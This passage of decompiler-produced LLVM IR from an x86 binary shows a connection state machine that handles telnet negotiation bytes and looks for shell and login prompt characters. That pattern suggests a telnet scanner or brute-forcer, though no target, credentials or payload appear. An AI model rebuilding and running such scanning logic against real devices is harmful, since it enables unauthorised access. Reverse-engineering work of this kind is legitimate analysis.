dec_label_pc_804e9cc.preheader:                   ; preds = %dec_label_pc_804e8c2
  %v0_804e9cc16 = load i32, i32* @edi, align 4
  %v1_804e9cc17 = add i32 %v0_804e9cc16, 12
  %v2_804e9cc18 = inttoptr i32 %v1_804e9cc17 to i32*
  %v3_804e9cc19 = load i32, i32* %v2_804e9cc18, align 4
  store i32 %v3_804e9cc19, i32* %eax.global-to-local, align 4
  %v1_804e9cf20 = icmp eq i32 %v3_804e9cc19, 0
  br i1 %v1_804e9cf20, label %dec_label_pc_804e8dd, label %dec_label_pc_804e9d7

dec_label_pc_804e8dd:                             ; preds = %dec_label_pc_804e9cc.backedge, %dec_label_pc_804e9cc.preheader, %dec_label_pc_804efb9, %dec_label_pc_804e8f7, %dec_label_pc_804e8c2, %dec_label_pc_804f497, %dec_label_pc_804f48b, %dec_label_pc_804eff1
  %v0_804e8dd = load i32, i32* @esp, align 4
  %v1_804e8dd = add i32 %v0_804e8dd, 1868
  %v2_804e8dd = inttoptr i32 %v1_804e8dd to i32*
  %v3_804e8dd = load i32, i32* %v2_804e8dd, align 4
  %v1_804e8e4 = add i32 %v3_804e8dd, 1
  store i32 %v1_804e8e4, i32* %eax.global-to-local, align 4
  store i32 %v1_804e8e4, i32* %v2_804e8dd, align 4
  %v0_804e8ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8ec = add i32 %v0_804e8ec, -255
  %v6_804e8ec = sub i32 254, %v0_804e8ec
  %v7_804e8ec = and i32 %v6_804e8ec, %v0_804e8ec
  %v8_804e8ec = icmp slt i32 %v7_804e8ec, 0
  %v9_804e8ec = icmp eq i32 %v1_804e8ec, 0
  %v10_804e8ec = icmp slt i32 %v1_804e8ec, 0
  %v3_804e8f1 = icmp eq i1 %v10_804e8ec, %v8_804e8ec
  %v4_804e8f1 = icmp eq i1 %v9_804e8ec, false
  %v5_804e8f1 = and i1 %v4_804e8f1, %v3_804e8f1
  br i1 %v5_804e8f1, label %.loopexit, label %dec_label_pc_804e8f7

dec_label_pc_804e8f7:                             ; preds = %dec_label_pc_804e8dd, %dec_label_pc_804e89a
  %v0_804e8f7 = phi i32 [ %v0_804e8ec, %dec_label_pc_804e8dd ], [ 0, %dec_label_pc_804e89a ]
  %v0_804e8fa = load i32, i32* @global_var_8054418.21, align 8
  store i32 %v0_804e8fa, i32* %ecx.global-to-local, align 4
  %v2_804e900 = mul i32 %v0_804e8f7, 288
  %v2_804e903 = add i32 %v0_804e8fa, %v2_804e900
  store i32 %v2_804e903, i32* @edi, align 4
  %v1_804e905 = add i32 %v2_804e903, 4
  %v2_804e905 = inttoptr i32 %v1_804e905 to i32*
  %v3_804e905 = load i32, i32* %v2_804e905, align 4
  store i32 %v3_804e905, i32* %ecx.global-to-local, align 4
  %v10_804e908 = icmp eq i32 %v3_804e905, -1
  br i1 %v10_804e908, label %dec_label_pc_804e8dd, label %dec_label_pc_804e90d

dec_label_pc_804e90d:                             ; preds = %dec_label_pc_804e8f7
  %v2_804e911 = udiv i32 %v3_804e905, 32
  store i32 %v2_804e911, i32* %edx.global-to-local, align 4
  %v1_804e914 = urem i32 %v3_804e905, 32
  store i32 %v1_804e914, i32* %eax.global-to-local, align 4
  %v0_804e917 = load i32, i32* @esp, align 4
  %v2_804e917 = mul nuw nsw i32 %v2_804e911, 4
  %v3_804e917 = add nuw nsw i32 %v2_804e917, 1572
  %v4_804e917 = add i32 %v3_804e917, %v0_804e917
  %v5_804e917 = inttoptr i32 %v4_804e917 to i32*
  %v6_804e917 = load i32, i32* %v5_804e917, align 4
  %v9_804e917 = shl i32 1, %v1_804e914
  %v10_804e917 = and i32 %v6_804e917, %v9_804e917
  %v11_804e917 = icmp ne i32 %v10_804e917, 0
  %v1_804e91f = zext i1 %v11_804e917 to i32
  store i32 %v1_804e91f, i32* %eax.global-to-local, align 4
  %v4_804e922 = icmp eq i1 %v11_804e917, false
  br i1 %v4_804e922, label %dec_label_pc_804e8c2, label %dec_label_pc_804e926

dec_label_pc_804e926:                             ; preds = %dec_label_pc_804e90d
  %v1_804e926 = add i32 %v0_804e917, 1872
  %v2_804e926 = inttoptr i32 %v1_804e926 to i32*
  store i32 0, i32* %v2_804e926, align 4
  %v0_804e931 = load i32, i32* @esp, align 4
  %v1_804e931 = add i32 %v0_804e931, 1864
  %v2_804e931 = inttoptr i32 %v1_804e931 to i32*
  store i32 4, i32* %v2_804e931, align 4
  %v0_804e93c = load i32, i32* @esp, align 4
  %v1_804e93f = add i32 %v0_804e93c, 1864
  %v2_804e946 = add i32 %v0_804e93c, -16
  %v3_804e946 = inttoptr i32 %v2_804e946 to i32*
  store i32 %v1_804e93f, i32* %v3_804e946, align 4
  %v1_804e947 = add i32 %v0_804e93c, 1872
  store i32 %v1_804e947, i32* %eax.global-to-local, align 4
  %v2_804e94e = add i32 %v0_804e93c, -20
  %v3_804e94e = inttoptr i32 %v2_804e94e to i32*
  store i32 %v1_804e947, i32* %v3_804e94e, align 4
  %v1_804e94f = add i32 %v0_804e93c, -24
  %v2_804e94f = inttoptr i32 %v1_804e94f to i32*
  store i32 4, i32* %v2_804e94f, align 4
  %v1_804e951 = add i32 %v0_804e93c, -28
  %v2_804e951 = inttoptr i32 %v1_804e951 to i32*
  store i32 1, i32* %v2_804e951, align 4
  %v0_804e953 = load i32, i32* @edi, align 4
  %v1_804e953 = add i32 %v0_804e953, 4
  %v2_804e953 = inttoptr i32 %v1_804e953 to i32*
  %v3_804e953 = load i32, i32* %v2_804e953, align 4
  store i32 %v3_804e953, i32* %edx.global-to-local, align 4
  %v2_804e956 = add i32 %v0_804e93c, -32
  %v3_804e956 = inttoptr i32 %v2_804e956 to i32*
  store i32 %v3_804e953, i32* %v3_804e956, align 4
  %v0_804e957 = call i32 @function_8050892()
  store i32 %v0_804e957, i32* %eax.global-to-local, align 4
  %v0_804e95c = load i32, i32* @esp, align 4
  %v2_804e95f = add i32 %v0_804e95c, 1904
  %v3_804e95f = inttoptr i32 %v2_804e95f to i32*
  %v4_804e95f = load i32, i32* %v3_804e95f, align 4
  %v5_804e95f = or i32 %v4_804e95f, %v0_804e957
  %v6_804e95f = icmp eq i32 %v5_804e95f, 0
  store i32 %v5_804e95f, i32* %eax.global-to-local, align 4
  %v1_804e966 = icmp eq i1 %v6_804e95f, false
  br i1 %v1_804e966, label %dec_label_pc_804f497, label %dec_label_pc_804e96c

dec_label_pc_804e96c:                             ; preds = %dec_label_pc_804e926
  %v0_804e96c = load i32, i32* @edi, align 4
  %v1_804e96c = add i32 %v0_804e96c, 12
  %v2_804e96c = inttoptr i32 %v1_804e96c to i32*
  store i32 2, i32* %v2_804e96c, align 4
  %v1_804e973 = call i32 @function_804d6e0(i32 ptrtoint (i32* @0 to i32))
  %v2_804e973 = sext i32 %v1_804e973 to i64
  %v0_804e978 = load i16, i16* @global_var_80543cc.22, align 4
  %v1_804e978 = zext i16 %v0_804e978 to i32
  %v0_804e985 = load i32, i32* @global_var_8054380.23, align 128
  store i32 %v0_804e985, i32* @ebx, align 4
  store i32 %v1_804e978, i32* %ecx.global-to-local, align 4
  %v8_804e98f = zext i16 %v0_804e978 to i64
  %v9_804e98f = udiv i64 %v2_804e973, %v8_804e98f
  %v10_804e98f = trunc i64 %v9_804e98f to i32
  store i32 %v10_804e98f, i32* %eax.global-to-local, align 4
  %v11_804e98f = urem i64 %v2_804e973, %v8_804e98f
  %v12_804e98f = trunc i64 %v11_804e98f to i32
  store i32 %v12_804e98f, i32* %edx.global-to-local, align 4
  %tmp107 = icmp slt i32 %v0_804e985, 1
  br i1 %tmp107, label %dec_label_pc_804f469, label %dec_label_pc_804e999

dec_label_pc_804e999:                             ; preds = %dec_label_pc_804e96c
  %v0_804e999 = load i32, i32* @global_var_80543c8.24, align 8
  store i32 %v0_804e999, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804e9ae = trunc i64 %v11_804e98f to i16
  br label %dec_label_pc_804e9ae

dec_label_pc_804e9a2:                             ; preds = %dec_label_pc_804e9b4, %dec_label_pc_804e9ae
  %v1_804e9a2 = add i32 %v0_804e9a2, 1
  store i32 %v1_804e9a2, i32* %ecx.global-to-local, align 4
  %v1_804e9a3 = add i32 %v0_804e9a3, 16
  store i32 %v1_804e9a3, i32* %eax.global-to-local, align 4
  %v12_804e9a6 = icmp eq i32 %v1_804e9a2, %v0_804e985
  br i1 %v12_804e9a6, label %dec_label_pc_804f469, label %dec_label_pc_804e9ae

dec_label_pc_804e9ae:                             ; preds = %dec_label_pc_804e9a2, %dec_label_pc_804e999
  %v0_804e9a2 = phi i32 [ %v1_804e9a2, %dec_label_pc_804e9a2 ], [ 0, %dec_label_pc_804e999 ]
  %v0_804e9a3 = phi i32 [ %v1_804e9a3, %dec_label_pc_804e9a2 ], [ %v0_804e999, %dec_label_pc_804e999 ]
  %v3_804e9ae = add i32 %v0_804e9a3, 8
  %v4_804e9ae = inttoptr i32 %v3_804e9ae to i16*
  %v5_804e9ae = load i16, i16* %v4_804e9ae, align 2
  %v11_804e9ae = icmp ult i16 %v1_804e9ae, %v5_804e9ae
  br i1 %v11_804e9ae, label %dec_label_pc_804e9a2, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9ae
  %v3_804e9b4 = add i32 %v0_804e9a3, 10
  %v4_804e9b4 = inttoptr i32 %v3_804e9b4 to i16*
  %v5_804e9b4 = load i16, i16* %v4_804e9b4, align 2
  %v11_804e9b4 = icmp ult i16 %v1_804e9ae, %v5_804e9b4
  %v1_804e9b8 = icmp eq i1 %v11_804e9b4, false
  br i1 %v1_804e9b8, label %dec_label_pc_804e9a2, label %dec_label_pc_804f46b

dec_label_pc_804e9d7:                             ; preds = %dec_label_pc_804e9cc.preheader, %dec_label_pc_804e9cc.backedge.dec_label_pc_804e9d7_crit_edge
  %v1_804e9da = phi i32 [ %v1_804e9da.pre, %dec_label_pc_804e9cc.backedge.dec_label_pc_804e9d7_crit_edge ], [ %v0_804e8ca, %dec_label_pc_804e9cc.preheader ]
  %v0_804e9d7 = phi i32 [ %v0_804e9cc, %dec_label_pc_804e9cc.backedge.dec_label_pc_804e9d7_crit_edge ], [ %v0_804e9cc16, %dec_label_pc_804e9cc.preheader ]
  %v1_804e9d7 = add i32 %v0_804e9d7, 28
  store i32 %v1_804e9d7, i32* %eax.global-to-local, align 4
  %v2_804e9da = add i32 %v1_804e9da, 16
  %v3_804e9da = inttoptr i32 %v2_804e9da to i32*
  store i32 %v1_804e9d7, i32* %v3_804e9da, align 4
  %v0_804e9de = load i32, i32* @edi, align 4
  %v1_804e9de = add i32 %v0_804e9de, 24
  %v2_804e9de = inttoptr i32 %v1_804e9de to i32*
  %v3_804e9de = load i32, i32* %v2_804e9de, align 4
  %v9_804e9de = icmp eq i32 %v3_804e9de, 256
  br i1 %v9_804e9de, label %dec_label_pc_804f015, label %dec_label_pc_804e9eb

dec_label_pc_804e9eb:                             ; preds = %dec_label_pc_804e9d7, %dec_label_pc_804f015
  %v0_804e9eb = load i32, i32* @esp, align 4
  %v1_804e9eb = add i32 %v0_804e9eb, 40
  %v2_804e9eb = inttoptr i32 %v1_804e9eb to i32*
  %v3_804e9eb = load i32, i32* %v2_804e9eb, align 4
  store i32 %v3_804e9eb, i32* %ecx.global-to-local, align 4
  %v1_804e9ef = add i32 %v0_804e9eb, 16
  %v2_804e9ef = inttoptr i32 %v1_804e9ef to i32*
  %v3_804e9ef = load i32, i32* %v2_804e9ef, align 4
  store i32 %v3_804e9ef, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804e9f8 = inttoptr i32 %v3_804e9eb to i32*
  store i32 0, i32* %v1_804e9f8, align 4
  %v0_804e9fe = load i32, i32* @edi, align 4
  %v1_804e9fe = add i32 %v0_804e9fe, 24
  %v2_804e9fe = inttoptr i32 %v1_804e9fe to i32*
  %v3_804e9fe = load i32, i32* %v2_804e9fe, align 4
  store i32 %v3_804e9fe, i32* %edx.global-to-local, align 4
  %v0_804ea01 = load i32, i32* @esp, align 4
  %v1_804ea01 = add i32 %v0_804ea01, -4
  %v2_804ea01 = inttoptr i32 %v1_804ea01 to i32*
  store i32 16384, i32* %v2_804ea01, align 4
  %v0_804ea06 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea06 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea06 = sub i32 %v0_804ea06, %v1_804ea06
  store i32 %v2_804ea06, i32* %eax.global-to-local, align 4
  %v0_804ea08 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ea08 = add i32 %v0_804ea08, %v1_804ea06
  store i32 %v2_804ea08, i32* @ebx, align 4
  %v2_804ea0a = add i32 %v0_804ea01, -8
  %v3_804ea0a = inttoptr i32 %v2_804ea0a to i32*
  store i32 %v2_804ea06, i32* %v3_804ea0a, align 4
  %v0_804ea0b = load i32, i32* @ebx, align 4
  %v2_804ea0b = add i32 %v0_804ea01, -12
  %v3_804ea0b = inttoptr i32 %v2_804ea0b to i32*
  store i32 %v0_804ea0b, i32* %v3_804ea0b, align 4
  %v0_804ea0c = load i32, i32* @edi, align 4
  %v1_804ea0c = add i32 %v0_804ea0c, 4
  %v2_804ea0c = inttoptr i32 %v1_804ea0c to i32*
  %v3_804ea0c = load i32, i32* %v2_804ea0c, align 4
  store i32 %v3_804ea0c, i32* %eax.global-to-local, align 4
  %v2_804ea0f = add i32 %v0_804ea01, -16
  %v3_804ea0f = inttoptr i32 %v2_804ea0f to i32*
  store i32 %v3_804ea0c, i32* %v3_804ea0f, align 4
  %v0_804ea10 = call i32 @function_80508f0()
  store i32 %v0_804ea10, i32* %eax.global-to-local, align 4
  %v0_804ea15 = load i32, i32* @esp, align 4
  %v1_804ea15 = add i32 %v0_804ea15, 16
  %tmp108 = icmp slt i32 %v0_804ea10, 1
  br i1 %tmp108, label %dec_label_pc_804efaa, label %dec_label_pc_804ea21

dec_label_pc_804ea21:                             ; preds = %dec_label_pc_804e9eb
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804ea23

dec_label_pc_804ea23:                             ; preds = %dec_label_pc_804ea2d, %dec_label_pc_804ea21
  %v0_804ea29 = phi i32 [ %v1_804ea2d, %dec_label_pc_804ea2d ], [ 0, %dec_label_pc_804ea21 ]
  %v1_804ea23 = load i32, i32* @ebx, align 4
  %v2_804ea23 = add i32 %v1_804ea23, %v0_804ea29
  %v3_804ea23 = inttoptr i32 %v2_804ea23 to i8*
  %v4_804ea23 = load i8, i8* %v3_804ea23, align 1
  %v5_804ea23 = icmp eq i8 %v4_804ea23, 0
  %v1_804ea27 = icmp eq i1 %v5_804ea23, false
  br i1 %v1_804ea27, label %dec_label_pc_804ea2d, label %dec_label_pc_804ea29

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804ea23
  store i8 65, i8* %v3_804ea23, align 1
  %v0_804ea2d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ea2d

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804ea23, %dec_label_pc_804ea29
  %v0_804ea2d = phi i32 [ %v0_804ea29, %dec_label_pc_804ea23 ], [ %v0_804ea2d.pre, %dec_label_pc_804ea29 ]
  %v1_804ea2d = add i32 %v0_804ea2d, 1
  store i32 %v1_804ea2d, i32* @edx, align 4
  %v12_804ea2e = icmp eq i32 %v0_804ea10, %v1_804ea2d
  %v1_804ea30 = icmp eq i1 %v12_804ea2e, false
  br i1 %v1_804ea30, label %dec_label_pc_804ea23, label %dec_label_pc_804ea32

dec_label_pc_804ea32:                             ; preds = %dec_label_pc_804ea2d, %dec_label_pc_804efb0
  %v0_804ea32 = load i32, i32* @edi, align 4
  %v1_804ea32 = add i32 %v0_804ea32, 24
  %v2_804ea32 = inttoptr i32 %v1_804ea32 to i32*
  %v3_804ea32 = load i32, i32* %v2_804ea32, align 4
  %v2_804ea35 = add i32 %v3_804ea32, %v0_804ea10
  %v0_804ea37 = load i32, i32* @global_var_80543d0.9, align 16
  store i32 %v0_804ea37, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea35, i32* %v2_804ea32, align 4
  %v0_804ea3f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea3f = load i32, i32* @edi, align 4
  %v2_804ea3f = add i32 %v1_804ea3f, 8
  %v3_804ea3f = inttoptr i32 %v2_804ea3f to i32*
  store i32 %v0_804ea3f, i32* %v3_804ea3f, align 4
  br label %dec_label_pc_804ea42

dec_label_pc_804ea42:                             ; preds = %dec_label_pc_804ed60, %dec_label_pc_804ea32
  %v0_804ea42 = load i32, i32* @edi, align 4
  %v1_804ea42 = add i32 %v0_804ea42, 12
  %v2_804ea42 = inttoptr i32 %v1_804ea42 to i32*
  %v3_804ea42 = load i32, i32* %v2_804ea42, align 4
  store i32 %v3_804ea42, i32* %eax.global-to-local, align 4
  switch i32 %v3_804ea42, label %dec_label_pc_804e9cc.backedge [
    i32 2, label %dec_label_pc_804ea52
    i32 3, label %dec_label_pc_804eafb
    i32 4, label %dec_label_pc_804eb40
    i32 5, label %dec_label_pc_804eb80
    i32 6, label %dec_label_pc_804ec10
    i32 7, label %dec_label_pc_804ed80
    i32 8, label %dec_label_pc_804ebc5
    i32 9, label %dec_label_pc_804ee3b
    i32 10, label %dec_label_pc_804eccb
  ]

dec_label_pc_804ea52:                             ; preds = %dec_label_pc_804ea42
  %v0_804ea52 = load i32, i32* @esp, align 4
  %v1_804ea52 = add i32 %v0_804ea52, 16
  %v2_804ea52 = inttoptr i32 %v1_804ea52 to i32*
  %v3_804ea52 = load i32, i32* %v2_804ea52, align 4
  store i32 %v3_804ea52, i32* @ebx, align 4
  %v1_804ea56 = add i32 %v0_804ea52, 32
  %v2_804ea56 = inttoptr i32 %v1_804ea56 to i32*
  store i32 0, i32* %v2_804ea56, align 4
  %v0_804ea5e = load i32, i32* @edi, align 4
  %v1_804ea5e = add i32 %v0_804ea5e, 24
  %v2_804ea5e = inttoptr i32 %v1_804ea5e to i32*
  %v3_804ea5e = load i32, i32* %v2_804ea5e, align 4
  store i32 %v3_804ea5e, i32* %edx.global-to-local, align 4
  %v0_804ea61199 = load i32, i32* @esp, align 4
  %v1_804ea61200 = add i32 %v0_804ea61199, 32
  %v2_804ea61201 = inttoptr i32 %v1_804ea61200 to i32*
  %v3_804ea61202 = load i32, i32* %v2_804ea61201, align 4
  %v5_804ea61203 = sub i32 %v3_804ea61202, %v3_804ea5e
  %v11_804ea61204 = xor i32 %v3_804ea61202, %v3_804ea5e
  %v12_804ea61205 = xor i32 %v5_804ea61203, %v3_804ea61202
  %v13_804ea61206 = and i32 %v12_804ea61205, %v11_804ea61204
  %v14_804ea61207 = icmp slt i32 %v13_804ea61206, 0
  %v16_804ea61208 = icmp slt i32 %v5_804ea61203, 0
  %v2_804ea65209 = icmp eq i1 %v16_804ea61208, %v14_804ea61207
  br i1 %v2_804ea65209, label %dec_label_pc_804eae3, label %dec_label_pc_804ea67.preheader

dec_label_pc_804ea67.preheader:                   ; preds = %dec_label_pc_804ea52, %dec_label_pc_804ea61.backedge
  %v0_804ea61211 = phi i32 [ %v0_804ea61, %dec_label_pc_804ea61.backedge ], [ %v0_804ea61199, %dec_label_pc_804ea52 ]
  %v4_804ea61210 = phi i32 [ %v4_804ea61.be, %dec_label_pc_804ea61.backedge ], [ %v3_804ea5e, %dec_label_pc_804ea52 ]
  br label %dec_label_pc_804ea67

dec_label_pc_804ea67:                             ; preds = %dec_label_pc_804ea67.preheader, %dec_label_pc_804eab8
  %v1_804ea73 = phi i32 [ %v4_804eadd, %dec_label_pc_804eab8 ], [ %v4_804ea61210, %dec_label_pc_804ea67.preheader ]
  %v1_804ef00 = phi i32 [ %v1_804eada, %dec_label_pc_804eab8 ], [ %v0_804ea61211, %dec_label_pc_804ea67.preheader ]
  %v0_804ea67 = load i32, i32* @ebx, align 4
  %v1_804ea67 = inttoptr i32 %v0_804ea67 to i8*
  %v2_804ea67 = load i8, i8* %v1_804ea67, align 1
  %v12_804ea67 = icmp eq i8 %v2_804ea67, -1
  %v1_804ea6a = icmp eq i1 %v12_804ea67, false
  br i1 %v1_804ea6a, label %dec_label_pc_804eae3, label %dec_label_pc_804ea6c

dec_label_pc_804ea6c:                             ; preds = %dec_label_pc_804ea67
  %v1_804ea6c = add i32 %v1_804ef00, 16
  %v2_804ea6c = inttoptr i32 %v1_804ea6c to i32*
  %v3_804ea6c = load i32, i32* %v2_804ea6c, align 4
  %v1_804ea70 = add i32 %v0_804ea67, 1
  store i32 %v1_804ea70, i32* %esi.global-to-local, align 4
  %v2_804ea73 = add i32 %v3_804ea6c, %v1_804ea73
  store i32 %v2_804ea73, i32* %ecx.global-to-local, align 4
  %tmp268 = icmp ugt i32 %v2_804ea73, %v1_804ea70
  br i1 %tmp268, label %dec_label_pc_804ea79, label %dec_label_pc_804eae3

dec_label_pc_804ea79:                             ; preds = %dec_label_pc_804ea6c
  %v2_804ea79 = inttoptr i32 %v1_804ea70 to i8*
  %v3_804ea79 = load i8, i8* %v2_804ea79, align 1
  %v4_804ea79 = zext i8 %v3_804ea79 to i32
  %v5_804ea79 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ea79 = and i32 %v5_804ea79, -256
  %v7_804ea79 = or i32 %v6_804ea79, %v4_804ea79
  store i32 %v7_804ea79, i32* %eax.global-to-local, align 4
  switch i8 %v3_804ea79, label %dec_label_pc_804ea8c [
    i8 -1, label %dec_label_pc_804eef6
    i8 -3, label %dec_label_pc_804ef1a
  ]

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea79
  %v1_804ea8c = add i32 %v0_804ea67, 2
  store i32 %v1_804ea8c, i32* %eax.global-to-local, align 4
  %tmp269 = icmp ugt i32 %v2_804ea73, %v1_804ea8c
  br i1 %tmp269, label %dec_label_pc_804ea93, label %dec_label_pc_804eae3

dec_label_pc_804ea93:                             ; preds = %dec_label_pc_804ea8c, %dec_label_pc_804f4d3, %dec_label_pc_804f4db, %dec_label_pc_804efa2
  %v0_804ea93 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ea93 = inttoptr i32 %v0_804ea93 to i8*
  %v2_804ea93 = load i8, i8* %v1_804ea93, align 1
  %v3_804ea93 = zext i8 %v2_804ea93 to i32
  %v4_804ea93 = load i32, i32* %eax.global-to-local, align 4
  %v5_804ea93 = and i32 %v4_804ea93, -256
  %v6_804ea93 = or i32 %v5_804ea93, %v3_804ea93
  store i32 %v6_804ea93, i32* %eax.global-to-local, align 4
  switch i8 %v2_804ea93, label %dec_label_pc_804eaa5 [
    i8 -3, label %dec_label_pc_804ef12
    i8 -5, label %dec_label_pc_804f004
  ]

dec_label_pc_804eaa5:                             ; preds = %dec_label_pc_804ea93, %dec_label_pc_804f004, %dec_label_pc_804ef12
  %v0_804eaa5 = load i32, i32* @ebx, align 4
  %v1_804eaa5 = add i32 %v0_804eaa5, 2
  %v2_804eaa5 = inttoptr i32 %v1_804eaa5 to i8*
  %v3_804eaa5 = load i8, i8* %v2_804eaa5, align 1
  %v4_804eaa5 = zext i8 %v3_804eaa5 to i32
  %v5_804eaa5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804eaa5 = and i32 %v5_804eaa5, -256
  %v7_804eaa5 = or i32 %v6_804eaa5, %v4_804eaa5
  store i32 %v7_804eaa5, i32* %eax.global-to-local, align 4
  switch i8 %v3_804eaa5, label %dec_label_pc_804eab8 [
    i8 -3, label %dec_label_pc_804ef09
    i8 -5, label %dec_label_pc_804f00c
  ]

dec_label_pc_804eab8:                             ; preds = %dec_label_pc_804eaa5, %dec_label_pc_804ef09, %dec_label_pc_804f00c
  %v0_804eab8 = load i32, i32* @esp, align 4
  %v1_804eab8 = add i32 %v0_804eab8, -4
  %v2_804eab8 = inttoptr i32 %v1_804eab8 to i32*
  store i32 16384, i32* %v2_804eab8, align 4
  %v1_804eabd = add i32 %v0_804eab8, -8
  %v2_804eabd = inttoptr i32 %v1_804eabd to i32*
  store i32 3, i32* %v2_804eabd, align 4
  %v0_804eabf = load i32, i32* @ebx, align 4
  %v2_804eabf = add i32 %v0_804eab8, -12
  %v3_804eabf = inttoptr i32 %v2_804eabf to i32*
  store i32 %v0_804eabf, i32* %v3_804eabf, align 4
  %v0_804eac0 = load i32, i32* @ebx, align 4
  %v1_804eac0 = add i32 %v0_804eac0, 3
  store i32 %v1_804eac0, i32* @ebx, align 4
  %v0_804eac3 = load i32, i32* @edi, align 4
  %v1_804eac3 = add i32 %v0_804eac3, 4
  %v2_804eac3 = inttoptr i32 %v1_804eac3 to i32*
  %v3_804eac3 = load i32, i32* %v2_804eac3, align 4
  store i32 %v3_804eac3, i32* %eax.global-to-local, align 4
  %v2_804eac6 = add i32 %v0_804eab8, -16
  %v3_804eac6 = inttoptr i32 %v2_804eac6 to i32*
  store i32 %v3_804eac3, i32* %v3_804eac6, align 4
  %v0_804eac7 = call i32 @function_8050966()
  store i32 %v0_804eac7, i32* %eax.global-to-local, align 4
  %v0_804eacc = load i32, i32* @esp, align 4
  %v1_804eacc = add i32 %v0_804eacc, 48
  %v2_804eacc = inttoptr i32 %v1_804eacc to i32*
  %v3_804eacc = load i32, i32* %v2_804eacc, align 4
  %v0_804ead0 = load i32, i32* @edi, align 4
  %v1_804ead0 = add i32 %v0_804ead0, 24
  %v2_804ead0 = inttoptr i32 %v1_804ead0 to i32*
  %v3_804ead0 = load i32, i32* %v2_804ead0, align 4
  store i32 %v3_804ead0, i32* %edx.global-to-local, align 4
  %v1_804ead3 = add i32 %v3_804eacc, 3
  store i32 %v1_804ead3, i32* %v2_804eacc, align 4
  %v0_804eada = load i32, i32* @esp, align 4
  %v1_804eada = add i32 %v0_804eada, 16
  %v1_804eadd = add i32 %v0_804eada, 48
  %v2_804eadd = inttoptr i32 %v1_804eadd to i32*
  %v3_804eadd = load i32, i32* %v2_804eadd, align 4
  %v4_804eadd = load i32, i32* %edx.global-to-local, align 4
  %v5_804eadd = sub i32 %v3_804eadd, %v4_804eadd
  %v11_804eadd = xor i32 %v4_804eadd, %v3_804eadd
  %v12_804eadd = xor i32 %v5_804eadd, %v3_804eadd
  %v13_804eadd = and i32 %v12_804eadd, %v11_804eadd
  %v14_804eadd = icmp slt i32 %v13_804eadd, 0
  %v16_804eadd = icmp slt i32 %v5_804eadd, 0
  %v2_804eae1 = icmp eq i1 %v16_804eadd, %v14_804eadd
  br i1 %v2_804eae1, label %dec_label_pc_804eae3, label %dec_label_pc_804ea67

dec_label_pc_804eae3:                             ; preds = %dec_label_pc_804ea52, %dec_label_pc_804ea61.backedge, %dec_label_pc_804ef1a, %dec_label_pc_804ea8c, %dec_label_pc_804ea6c, %dec_label_pc_804eab8, %dec_label_pc_804ea67
  %v0_804eae3 = phi i32 [ %v1_804eada, %dec_label_pc_804eab8 ], [ %v1_804ef00, %dec_label_pc_804ea8c ], [ %v1_804ef00, %dec_label_pc_804ea6c ], [ %v1_804ef00, %dec_label_pc_804ea67 ], [ %v0_804ef7a, %dec_label_pc_804ef1a ], [ %v0_804ea61199, %dec_label_pc_804ea52 ], [ %v0_804ea61, %dec_label_pc_804ea61.backedge ]
  %v1_804eae3 = add i32 %v0_804eae3, 32
  %v2_804eae3 = inttoptr i32 %v1_804eae3 to i32*
  %v3_804eae3 = load i32, i32* %v2_804eae3, align 4
  store i32 %v3_804eae3, i32* @esi, align 4
  %tmp109 = icmp slt i32 %v3_804eae3, 1
  br i1 %tmp109, label %dec_label_pc_804f038, label %dec_label_pc_804eaef

dec_label_pc_804eaef:                             ; preds = %dec_label_pc_804eae3
  %v0_804eaef = load i32, i32* @edi, align 4
  %v1_804eaef = add i32 %v0_804eaef, 12
  %v2_804eaef = inttoptr i32 %v1_804eaef to i32*
  store i32 3, i32* %v2_804eaef, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804eafb:                             ; preds = %dec_label_pc_804ea42
  %v1_804eafb = add i32 %v0_804ea42, 24
  %v2_804eafb = inttoptr i32 %v1_804eafb to i32*
  %v3_804eafb = load i32, i32* %v2_804eafb, align 4
  %v1_804eafe = add i32 %v3_804eafb, -1
  store i32 %v1_804eafe, i32* %eax.global-to-local, align 4
  %tmp110 = icmp slt i32 %v1_804eafe, 1
  br i1 %tmp110, label %dec_label_pc_804f20b, label %dec_label_pc_804eb07.preheader

dec_label_pc_804eb07.preheader:                   ; preds = %dec_label_pc_804eafb
  %v7_804eb07.pre = load i32, i32* @edx, align 4
  %v2_804eb07 = add i32 %v0_804ea42, 28
  br label %dec_label_pc_804eb07

dec_label_pc_804eb07:                             ; preds = %dec_label_pc_804eb07.preheader, %dec_label_pc_804eb38
  %v7_804eb07 = phi i32 [ %v7_804eb07.pre, %dec_label_pc_804eb07.preheader ], [ %v9_804eb07, %dec_label_pc_804eb38 ]
  %v0_804f1ff = phi i32 [ %v1_804eafe, %dec_label_pc_804eb07.preheader ], [ %v1_804eb38, %dec_label_pc_804eb38 ]
  %v3_804eb07 = add i32 %v2_804eb07, %v0_804f1ff
  %v4_804eb07 = inttoptr i32 %v3_804eb07 to i8*
  %v5_804eb07 = load i8, i8* %v4_804eb07, align 1
  %v6_804eb07 = zext i8 %v5_804eb07 to i32
  %v8_804eb07 = and i32 %v7_804eb07, -256
  %v9_804eb07 = or i32 %v6_804eb07, %v8_804eb07
  store i32 %v9_804eb07, i32* %edx.global-to-local, align 4
  switch i8 %v5_804eb07, label %dec_label_pc_804eb38 [
    i8 58, label %dec_label_pc_804f1ff
    i8 62, label %dec_label_pc_804f1ff
    i8 36, label %dec_label_pc_804f1ff
    i8 35, label %dec_label_pc_804f1ff
    i8 37, label %dec_label_pc_804f1ff
  ]

dec_label_pc_804eb38:                             ; preds = %dec_label_pc_804eb07
